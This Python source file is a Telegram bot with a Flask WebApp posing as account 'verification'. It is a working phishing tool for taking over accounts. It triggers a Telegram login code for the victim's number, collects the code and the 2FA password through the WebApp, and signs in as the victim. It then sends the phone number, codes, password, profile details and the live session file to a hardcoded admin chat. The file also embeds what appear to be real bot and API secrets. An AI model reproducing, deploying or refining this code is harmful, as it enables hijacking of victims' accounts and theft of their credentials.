import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import logging
from datetime import datetime

# ==================== SETUP ====================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
verification_data = {}

# ==================== ASYNC FUNCTIONS ====================
async def send_otp_async(phone):
    """Send OTP using Telethon"""
    try:
        # Create session
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        os.makedirs('sessions', exist_ok=True)
        
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        sent = await client.send_code_request(phone)
        
        # Store only session name and hash
        return {
            'success': True,
            'phone_code_hash': sent.phone_code_hash,
            'session_name': session_name
        }
        
    except FloodWaitError as e:
        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Send OTP error: {e}")
        return {'success': False, 'error': str(e)}

async def verify_otp_async(phone, otp_code, phone_code_hash, session_name):
    """Verify OTP and save session if 2FA needed"""
    try:
        # Create fresh client
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        try:
            # Try to sign in with OTP
            await client.sign_in(
                phone=phone,
                code=otp_code,
                phone_code_hash=phone_code_hash
            )
            
            # If success, get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session file
            await client.session.save()
            session_file = f"{client.session.filename}.session"
            
            await client.disconnect()
            
            # Send to admin immediately
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            await loop.run_in_executor(None, lambda: send_to_admin(
                phone, 
                otp=otp_code, 
                user_info=user_info, 
                session_file=session_file
            ))
            loop.close()
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
            
        except SessionPasswordNeededError:
            # 2FA required - save the authorized session state
            logger.info(f"🔐 2FA required for {phone}")
            
            # IMPORTANT: Save session in 2FA pending state
            await client.session.save()
            
            # Store session name for 2FA
            await client.disconnect()
            
            return {
                'success': True,
                'requires_2fa': True,
                'session_name': session_name
            }
            
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'success': False, 'error': 'Invalid OTP'}
            
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(session_name, password):
    """Complete 2FA verification"""
    try:
        # Load the saved session (already in 2FA pending state)
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        # Complete 2FA sign in
        await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save final session
        await client.session.save()
        session_file = f"{client.session.filename}.session"
        
        await client.disconnect()
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
        
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return {'success': False, 'error': str(e)}

# Thread-safe async runner
def run_async(coro):
    """Run async function safely"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(coro)
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Async runner error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>VERIFICATION SUCCESS!</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if name:
                message += f"\n👤 Name: {name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            if user_info.get('id'):
                message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        # Send message
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
                logger.info(f"✅ Session file sent: {session_file}")
            except Exception as e:
                logger.error(f"Error sending session: {e}")
        
        logger.info(f"📨 Admin notified: {phone}")
        return True
        
    except Exception as e:
        logger.error(f"Admin notify error: {e}")
        return False

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        # WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        bot.send_message(
            message.chat.id,
            f"""👋 <b>Hello {first_name}!</b>

Click below to verify your account:""",
            parse_mode='HTML',
            reply_markup=kb
        )
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'contact_time': time.time()
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ Contact received!\n📱 Phone: {phone}\n\n⏳ Sending OTP...",
            parse_mode='HTML'
        )
        
        # Send OTP
        def send_otp_task():
            try:
                result = run_async(send_otp_async(phone))
                
                if result['success']:
                    verification_data[user_id] = {
                        'phone': phone,
                        'phone_code_hash': result['phone_code_hash'],
                        'session_name': result['session_name']
                    }
                    
                    bot.edit_message_text(
                        f"""✅ <b>OTP SENT!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> sent via Telegram

Check your messages and enter the code in WebApp.""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin OTP sent
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                else:
                    bot.edit_message_text(
                        f"❌ Error: {result.get('error', 'Failed')}",
                        message.chat.id,
                        msg.message_id
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
        
        threading.Thread(target=send_otp_task).start()
        
        # Delete contact
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    data = user_data.get(user_id, {})
    return jsonify({
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', '')
    })

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verify for {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Clean OTP
        if len(otp) != 5 or not otp.isdigit():
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Get verification data
        verify_data = verification_data.get(int(user_id))
        if not verify_data:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        phone = verify_data['phone']
        phone_code_hash = verify_data['phone_code_hash']
        session_name = verify_data['session_name']
        
        # Verify OTP
        result = run_async(verify_otp_async(
            phone, otp, phone_code_hash, session_name
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                # Store session name for 2FA
                verification_data[int(user_id)]['session_name'] = result['session_name']
                verification_data[int(user_id)]['needs_2fa'] = True
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # OTP success - already sent to admin
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        logger.info(f"🔐 2FA verify for {user_id}")
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Get session
        verify_data = verification_data.get(int(user_id))
        if not verify_data or not verify_data.get('needs_2fa'):
            return jsonify({'success': False, 'error': 'No 2FA pending'})
        
        session_name = verify_data['session_name']
        
        # Verify 2FA
        result = run_async(verify_2fa_async(session_name, password))
        
        if result['success']:
            # Success - send to admin
            user_info = result.get('user_info', {})
            session_file = result.get('session_file', '')
            phone = verify_data['phone']
            
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_file=session_file
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Invalid password')
            })
            
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot - WORKING")
    logger.info("="*60)
    
    # Webhook setup
    try:
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook" if RENDER_EXTERNAL_HOSTNAME else None
        else:
            port = os.environ.get('PORT', 5000)
            WEBHOOK_URL = f"http://localhost:{port}/webhook"
        
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            logger.info(f"✅ Webhook: {WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        # Fallback polling
        def run_polling():
            bot.polling(none_stop=True, interval=3)
        
        threading.Thread(target=run_polling, daemon=True).start()
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
        )
